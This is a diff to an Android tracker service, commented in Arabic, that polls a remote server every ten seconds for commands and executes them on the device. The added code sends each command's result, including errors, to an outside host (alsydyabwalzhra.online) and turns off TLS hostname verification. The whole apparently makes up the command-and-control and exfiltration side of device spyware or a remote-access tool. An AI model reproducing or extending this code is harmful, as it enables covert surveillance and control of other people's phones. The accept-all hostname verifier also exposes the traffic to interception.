@@ -183,9 +183,15 @@ class MainTrackerService : Service() {
                                     } else {
                                         org.json.JSONObject()
                                     }
-                                    CommandExecutor.execute(this@MainTrackerService, cmd.command, params)
+                                    // تنفيذ الأمر والحصول على النتيجة
+                                    val result = CommandExecutor.execute(this@MainTrackerService, cmd.command, params)
+                                    Log.d(TAG, "نتيجة الأمر ${cmd.command}: ${result.take(200)}")
+
+                                    // إرسال النتيجة للسيرفر عبر API
+                                    reportCommandResult(cmd.id ?: "", cmd.command, result, deviceId)
                                 } catch (e: Exception) {
                                     Log.e(TAG, "خطأ في تنفيذ الأمر ${cmd.command}: ${e.message}")
+                                    reportCommandResult(cmd.id ?: "", cmd.command, "{\"ok\":false,\"error\":\"${e.message}\"}", deviceId)
                                 }
                             }
                         }
@@ -194,6 +200,40 @@ class MainTrackerService : Service() {
                     Log.e(TAG, "خطأ في استطلاع السيرفر: ${e.message}")
                 }
                 delay(10_000) // فحص كل 10 ثوان
+            }
+        }
+    }
+
+    /**
+     * إرسال نتيجة الأمر للسيرفر و Firebase
+     */
+    private fun reportCommandResult(cmdId: String, command: String, result: String, deviceId: String) {
+        if (cmdId.isEmpty()) {
+            Log.w(TAG, "معرف الأمر فارغ - لا يمكن إرسال النتيجة")
+            return
+        }
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                // 1. إرسال النتيجة للسيرفر عبر REST API
+                val serverUrl = "https://alsydyabwalzhra.online/api/command_result/$cmdId"
+                val url = java.net.URL(serverUrl)
+                val connection = url.openConnection() as java.net.HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                connection.connectTimeout = 15000
+                connection.readTimeout = 15000
+                connection.doOutput = true
+                connection.sslSocketFactory = javax.net.ssl.HttpsURLConnection.getDefaultSSLSocketFactory()
+                connection.hostnameVerifier = javax.net.ssl.HostnameVerifier { _, _ -> true }
+
+                val payload = "{\"status\":\"completed\",\"result\":${org.json.JSONObject.quote(result)}}"
+                java.io.OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }
+
+                val responseCode = connection.responseCode
+                Log.d(TAG, "إرسال نتيجة الأمر $cmdId للسيرفر: $responseCode")
+                connection.disconnect()
+            } catch (e: Exception) {
+                Log.e(TAG, "خطأ في إرسال نتيجة الأمر للسيرفر: ${e.message}")
             }
         }
     }
